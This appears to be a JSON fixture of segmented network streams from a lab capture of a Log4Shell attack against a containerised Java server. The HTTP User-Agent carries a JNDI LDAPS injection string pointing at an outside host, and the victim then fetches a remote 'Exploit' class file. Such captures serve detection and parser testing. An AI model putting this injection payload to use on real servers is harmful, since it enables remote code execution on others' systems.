@@ -1,0 +1,432 @@
+{
+  "streams": [
+    {
+      "stream_key": "172.17.0.1:38144-172.17.0.2:8000-tcp",
+      "protocol": "HTTP",
+      "encrypted": false,
+      "segments": [
+        {
+          "no": 4,
+          "time": 0.000189,
+          "timestamp_utc": "2021-12-14T21:25:13.655486000Z",
+          "position": "http_request.uri",
+          "payload": "/test"
+        },
+        {
+          "no": 4,
+          "time": 0.000189,
+          "timestamp_utc": "2021-12-14T21:25:13.655486000Z",
+          "position": "http_request.full_uri",
+          "payload": "http://172.17.0.2:8000/test"
+        },
+        {
+          "no": 4,
+          "time": 0.000189,
+          "timestamp_utc": "2021-12-14T21:25:13.655486000Z",
+          "position": "http_header.host",
+          "payload": "172.17.0.2:8000"
+        },
+        {
+          "no": 4,
+          "time": 0.000189,
+          "timestamp_utc": "2021-12-14T21:25:13.655486000Z",
+          "position": "http_header.user_agent",
+          "payload": "${jndi:ldaps://ldaps.suspect.network:1399/Basic/Command/Base64/cGluZyAtYyAxMCAxLjEuMS4x}"
+        },
+        {
+          "no": 4,
+          "time": 0.000189,
+          "timestamp_utc": "2021-12-14T21:25:13.655486000Z",
+          "position": "http_header.request_line",
+          "payload": "Host: 172.17.0.2:8000\r\n"
+        },
+        {
+          "no": 4,
+          "time": 0.000189,
+          "timestamp_utc": "2021-12-14T21:25:13.655486000Z",
+          "position": "http_header.request_line",
+          "payload": "User-Agent: ${jndi:ldaps://ldaps.suspect.network:1399/Basic/Command/Base64/cGluZyAtYyAxMCAxLjEuMS4x}\r\n"
+        },
+        {
+          "no": 4,
+          "time": 0.000189,
+          "timestamp_utc": "2021-12-14T21:25:13.655486000Z",
+          "position": "http_header.request_line",
+          "payload": "Accept-Encoding: gzip, deflate\r\n"
+        },
+        {
+          "no": 4,
+          "time": 0.000189,
+          "timestamp_utc": "2021-12-14T21:25:13.655486000Z",
+          "position": "http_header.request_line",
+          "payload": "Accept: */*\r\n"
+        },
+        {
+          "no": 4,
+          "time": 0.000189,
+          "timestamp_utc": "2021-12-14T21:25:13.655486000Z",
+          "position": "http_header.request_line",
+          "payload": "Connection: keep-alive\r\n"
+        },
+        {
+          "no": 4,
+          "time": 0.000189,
+          "timestamp_utc": "2021-12-14T21:25:13.655486000Z",
+          "position": "http_field.text[0]",
+          "payload": "GET /test HTTP/1.1\\r\\n"
+        },
+        {
+          "no": 4,
+          "time": 0.000189,
+          "timestamp_utc": "2021-12-14T21:25:13.655486000Z",
+          "position": "http_field.text[1]",
+          "payload": "\\r\\n"
+        },
+        {
+          "no": 4,
+          "time": 0.000189,
+          "timestamp_utc": "2021-12-14T21:25:13.655486000Z",
+          "position": "tcp_payload.text",
+          "payload": "GET /test HTTP/1.1\r\nHost: 172.17.0.2:8000\r\nUser-Agent: ${jndi:ldaps://ldaps.suspect.network:1399/Basic/Command/Base64/cGluZyAtYyAxMCAxLjEuMS4x}\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n"
+        }
+      ]
+    },
+    {
+      "stream_key": "172.17.0.2:46260-34.91.73.37:1399-tcp",
+      "protocol": "TLS",
+      "encrypted": true,
+      "segments": [
+        {
+          "no": 9,
+          "time": 0.018335,
+          "timestamp_utc": "2021-12-14T21:25:13.673632000Z",
+          "position": "encrypted_tls_stream",
+          "payload": "",
+          "notes": "encrypted stream; payload not extracted by json_segmenter"
+        },
+        {
+          "no": 15,
+          "time": 0.101304,
+          "timestamp_utc": "2021-12-14T21:25:13.756601000Z",
+          "position": "encrypted_tls_stream",
+          "payload": "",
+          "notes": "encrypted stream; payload not extracted by json_segmenter"
+        },
+        {
+          "no": 17,
+          "time": 0.112264,
+          "timestamp_utc": "2021-12-14T21:25:13.767561000Z",
+          "position": "encrypted_tls_stream",
+          "payload": "",
+          "notes": "encrypted stream; payload not extracted by json_segmenter"
+        },
+        {
+          "no": 19,
+          "time": 0.138867,
+          "timestamp_utc": "2021-12-14T21:25:13.794164000Z",
+          "position": "encrypted_tls_stream",
+          "payload": "",
+          "notes": "encrypted stream; payload not extracted by json_segmenter"
+        },
+        {
+          "no": 23,
+          "time": 0.144636,
+          "timestamp_utc": "2021-12-14T21:25:13.799933000Z",
+          "position": "encrypted_tls_stream",
+          "payload": "",
+          "notes": "encrypted stream; payload not extracted by json_segmenter"
+        },
+        {
+          "no": 27,
+          "time": 0.149146,
+          "timestamp_utc": "2021-12-14T21:25:13.804443000Z",
+          "position": "encrypted_tls_stream",
+          "payload": "",
+          "notes": "encrypted stream; payload not extracted by json_segmenter"
+        },
+        {
+          "no": 42,
+          "time": 0.19114,
+          "timestamp_utc": "2021-12-14T21:25:13.846437000Z",
+          "position": "encrypted_tls_stream",
+          "payload": "",
+          "notes": "encrypted stream; payload not extracted by json_segmenter"
+        },
+        {
+          "no": 43,
+          "time": 0.191474,
+          "timestamp_utc": "2021-12-14T21:25:13.846771000Z",
+          "position": "encrypted_tls_stream",
+          "payload": "",
+          "notes": "encrypted stream; payload not extracted by json_segmenter"
+        }
+      ]
+    },
+    {
+      "stream_key": "34.91.73.37:1399-172.17.0.2:46260-tcp",
+      "protocol": "TLS",
+      "encrypted": true,
+      "segments": [
+        {
+          "no": 11,
+          "time": 0.019291,
+          "timestamp_utc": "2021-12-14T21:25:13.674588000Z",
+          "position": "encrypted_tls_stream",
+          "payload": "",
+          "notes": "encrypted stream; payload not extracted by json_segmenter"
+        },
+        {
+          "no": 13,
+          "time": 0.020874,
+          "timestamp_utc": "2021-12-14T21:25:13.676171000Z",
+          "position": "encrypted_tls_stream",
+          "payload": "",
+          "notes": "encrypted stream; payload not extracted by json_segmenter"
+        },
+        {
+          "no": 21,
+          "time": 0.139624,
+          "timestamp_utc": "2021-12-14T21:25:13.794921000Z",
+          "position": "encrypted_tls_stream",
+          "payload": "",
+          "notes": "encrypted stream; payload not extracted by json_segmenter"
+        },
+        {
+          "no": 25,
+          "time": 0.146666,
+          "timestamp_utc": "2021-12-14T21:25:13.801963000Z",
+          "position": "encrypted_tls_stream",
+          "payload": "",
+          "notes": "encrypted stream; payload not extracted by json_segmenter"
+        },
+        {
+          "no": 28,
+          "time": 0.153998,
+          "timestamp_utc": "2021-12-14T21:25:13.809295000Z",
+          "position": "encrypted_tls_stream",
+          "payload": "",
+          "notes": "encrypted stream; payload not extracted by json_segmenter"
+        },
+        {
+          "no": 30,
+          "time": 0.154338,
+          "timestamp_utc": "2021-12-14T21:25:13.809635000Z",
+          "position": "encrypted_tls_stream",
+          "payload": "",
+          "notes": "encrypted stream; payload not extracted by json_segmenter"
+        },
+        {
+          "no": 45,
+          "time": 0.192381,
+          "timestamp_utc": "2021-12-14T21:25:13.847678000Z",
+          "position": "encrypted_tls_stream",
+          "payload": "",
+          "notes": "encrypted stream; payload not extracted by json_segmenter"
+        }
+      ]
+    },
+    {
+      "stream_key": "172.17.0.2:54792-34.91.73.37:8080-tcp",
+      "protocol": "HTTP",
+      "encrypted": false,
+      "segments": [
+        {
+          "no": 35,
+          "time": 0.170391,
+          "timestamp_utc": "2021-12-14T21:25:13.825688000Z",
+          "position": "http_request.uri",
+          "payload": "/ExploitxuNuemtKdH.class"
+        },
+        {
+          "no": 35,
+          "time": 0.170391,
+          "timestamp_utc": "2021-12-14T21:25:13.825688000Z",
+          "position": "http_request.full_uri",
+          "payload": "http://34.91.73.37:8080/ExploitxuNuemtKdH.class"
+        },
+        {
+          "no": 35,
+          "time": 0.170391,
+          "timestamp_utc": "2021-12-14T21:25:13.825688000Z",
+          "position": "http_header.host",
+          "payload": "34.91.73.37:8080"
+        },
+        {
+          "no": 35,
+          "time": 0.170391,
+          "timestamp_utc": "2021-12-14T21:25:13.825688000Z",
+          "position": "http_header.user_agent",
+          "payload": "Java/1.8.0_181"
+        },
+        {
+          "no": 35,
+          "time": 0.170391,
+          "timestamp_utc": "2021-12-14T21:25:13.825688000Z",
+          "position": "http_header.request_line",
+          "payload": "User-Agent: Java/1.8.0_181\r\n"
+        },
+        {
+          "no": 35,
+          "time": 0.170391,
+          "timestamp_utc": "2021-12-14T21:25:13.825688000Z",
+          "position": "http_header.request_line",
+          "payload": "Host: 34.91.73.37:8080\r\n"
+        },
+        {
+          "no": 35,
+          "time": 0.170391,
+          "timestamp_utc": "2021-12-14T21:25:13.825688000Z",
+          "position": "http_header.request_line",
+          "payload": "Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2\r\n"
+        },
+        {
+          "no": 35,
+          "time": 0.170391,
+          "timestamp_utc": "2021-12-14T21:25:13.825688000Z",
+          "position": "http_header.request_line",
+          "payload": "Connection: keep-alive\r\n"
+        },
+        {
+          "no": 35,
+          "time": 0.170391,
+          "timestamp_utc": "2021-12-14T21:25:13.825688000Z",
+          "position": "http_field.text[0]",
+          "payload": "GET /ExploitxuNuemtKdH.class HTTP/1.1\\r\\n"
+        },
+        {
+          "no": 35,
+          "time": 0.170391,
+          "timestamp_utc": "2021-12-14T21:25:13.825688000Z",
+          "position": "http_field.text[1]",
+          "payload": "\\r\\n"
+        },
+        {
+          "no": 35,
+          "time": 0.170391,
+          "timestamp_utc": "2021-12-14T21:25:13.825688000Z",
+          "position": "tcp_payload.text",
+          "payload": "GET /ExploitxuNuemtKdH.class HTTP/1.1\r\nUser-Agent: Java/1.8.0_181\r\nHost: 34.91.73.37:8080\r\nAccept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2\r\nConnection: keep-alive\r\n\r\n"
+        }
+      ]
+    },
+    {
+      "stream_key": "34.91.73.37:8080-172.17.0.2:54792-tcp",
+      "protocol": "TCP",
+      "encrypted": false,
+      "segments": [
+        {
+          "no": 37,
+          "time": 0.173194,
+          "timestamp_utc": "2021-12-14T21:25:13.828491000Z",
+          "position": "tcp_payload.text",
+          "payload": "HTTP/1.1 200 OK\r\nDate: Tue, 14 Dec 2021 21:25:13 GMT\r\nContent-length: 1217\r\n\r\n"
+        },
+        {
+          "no": 39,
+          "time": 0.173721,
+          "timestamp_utc": "2021-12-14T21:25:13.829018000Z",
+          "position": "http_request.uri",
+          "payload": "/ExploitxuNuemtKdH.class"
+        },
+        {
+          "no": 39,
+          "time": 0.173721,
+          "timestamp_utc": "2021-12-14T21:25:13.829018000Z",
+          "position": "http_request.full_uri",
+          "payload": "http://34.91.73.37:8080/ExploitxuNuemtKdH.class"
+        },
+        {
+          "no": 39,
+          "time": 0.173721,
+          "timestamp_utc": "2021-12-14T21:25:13.829018000Z",
+          "position": "http_field.text[0]",
+          "payload": "HTTP/1.1 200 OK\\r\\n"
+        },
+        {
+          "no": 39,
+          "time": 0.173721,
+          "timestamp_utc": "2021-12-14T21:25:13.829018000Z",
+          "position": "http_field.text[1]",
+          "payload": "\\r\\n"
+        },
+        {
+          "no": 39,
+          "time": 0.173721,
+          "timestamp_utc": "2021-12-14T21:25:13.829018000Z",
+          "position": "http_header.response_line",
+          "payload": "Date: Tue, 14 Dec 2021 21:25:13 GMT\r\n"
+        },
+        {
+          "no": 39,
+          "time": 0.173721,
+          "timestamp_utc": "2021-12-14T21:25:13.829018000Z",
+          "position": "http_header.response_line",
+          "payload": "Content-length: 1217\r\n"
+        }
+      ]
+    },
+    {
+      "stream_key": "172.17.0.2:8000-172.17.0.1:38144-tcp",
+      "protocol": "TCP",
+      "encrypted": false,
+      "segments": [
+        {
+          "no": 50,
+          "time": 0.197783,
+          "timestamp_utc": "2021-12-14T21:25:13.853080000Z",
+          "position": "tcp_payload.text",
+          "payload": "HTTP/1.1 200 OK\r\nDate: Tue, 14 Dec 2021 21:25:13 GMT\r\nContent-length: 20\r\n\r\n"
+        },
+        {
+          "no": 52,
+          "time": 0.198971,
+          "timestamp_utc": "2021-12-14T21:25:13.854268000Z",
+          "position": "http_request.uri",
+          "payload": "/test"
+        },
+        {
+          "no": 52,
+          "time": 0.198971,
+          "timestamp_utc": "2021-12-14T21:25:13.854268000Z",
+          "position": "http_request.full_uri",
+          "payload": "http://172.17.0.2:8000/test"
+        },
+        {
+          "no": 52,
+          "time": 0.198971,
+          "timestamp_utc": "2021-12-14T21:25:13.854268000Z",
+          "position": "http_field.text[0]",
+          "payload": "HTTP/1.1 200 OK\\r\\n"
+        },
+        {
+          "no": 52,
+          "time": 0.198971,
+          "timestamp_utc": "2021-12-14T21:25:13.854268000Z",
+          "position": "http_field.text[1]",
+          "payload": "\\r\\n"
+        },
+        {
+          "no": 52,
+          "time": 0.198971,
+          "timestamp_utc": "2021-12-14T21:25:13.854268000Z",
+          "position": "http_header.response_line",
+          "payload": "Date: Tue, 14 Dec 2021 21:25:13 GMT\r\n"
+        },
+        {
+          "no": 52,
+          "time": 0.198971,
+          "timestamp_utc": "2021-12-14T21:25:13.854268000Z",
+          "position": "http_header.response_line",
+          "payload": "Content-length: 20\r\n"
+        },
+        {
+          "no": 52,
+          "time": 0.198971,
+          "timestamp_utc": "2021-12-14T21:25:13.854268000Z",
+          "position": "tcp_payload.text",
+          "payload": "This is the response"
+        }
+      ]
+    }
+  ]
+}
